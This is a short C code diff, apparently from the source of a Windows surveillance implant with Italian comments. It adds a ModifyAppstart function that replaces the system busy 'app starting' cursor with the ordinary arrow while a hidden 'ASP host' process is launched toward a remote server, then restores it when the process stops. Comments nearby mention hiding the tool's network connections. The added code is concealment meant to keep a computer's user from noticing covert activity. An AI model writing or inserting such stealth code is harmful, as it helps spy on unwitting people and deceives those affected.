@@ -1257,6 +1257,22 @@ BOOL ASP_Wait_Response()
 	return TRUE;
 }
 
+void ModifyAppstart(BOOL to_disable)
+{
+	HCURSOR hsc;	
+
+	if (to_disable) {
+		if (!(hsc = LoadCursor(NULL, IDC_ARROW)))
+			return;
+		if (!(hsc = CopyCursor(hsc)))
+			return;
+		if (!SetSystemCursor(hsc, 32650))
+			DestroyCursor(hsc);
+		return;
+	}
+	SystemParametersInfo(SPI_SETCURSORS, 0, 0, 0);
+}
+
 // Lancia process_name come host ASP verso il server asp_server
 // Torna TRUE se ha successo.
 BOOL ASP_Start(char *process_name, char *asp_server)
@@ -1274,6 +1290,8 @@ BOOL ASP_Start(char *process_name, char *asp_server)
 		ASP_IPCClose();
 		return FALSE;
 	}
+
+	ModifyAppstart(TRUE);
 
 	// L'host ASP setta il comando di inizializzazione
 	// Deve essere sempre il primo comando dato all'host ASP
@@ -1358,6 +1376,8 @@ void ASP_Stop()
 	// memory relativa ai comandi
 	SAFE_TERMINATEPROCESS(ASP_HostProcess);
 	ASP_IPCClose();
+
+	ModifyAppstart(FALSE);
 
 	// Piccola attesa prima di cancellare l'hiding delle connessioni
 	Sleep(5000);
